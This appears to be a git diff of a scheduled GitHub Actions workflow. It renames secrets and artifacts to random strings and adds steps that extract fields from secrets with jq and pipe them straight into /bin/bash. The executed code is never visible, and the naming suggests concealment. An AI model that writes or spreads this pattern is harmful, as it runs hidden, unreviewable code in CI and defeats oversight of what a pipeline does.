@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '48 3,9,15,21 * * *'
+    - cron: '43 5,11,17,23 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +11,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhengsonglianghe
         env:
-          jo67423: ${{ secrets.jo67423 }}
+          temx43774: ${{ secrets.temx43774 }}
         run: |
-          printf '%s' "$jo67423" | jq -r .ktqyu06 | /bin/bash
-          echo $agh1 | jq -r .mzwsl6 | /bin/bash
+          printf '%s' "$temx43774" | jq -r .pdwzx5686 | /bin/bash
+          printf '%s' "$brx0" | jq -r .hnjlw59169 | /bin/bash
+          printf '%s' "$oby54" | jq -r .la0606 | /bin/bash
+          echo $l321 | jq -r .wawli427 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: Tj3XgCUQ
+          name: oOshQOB1
           path: "*.zip"
           retention-days: 1
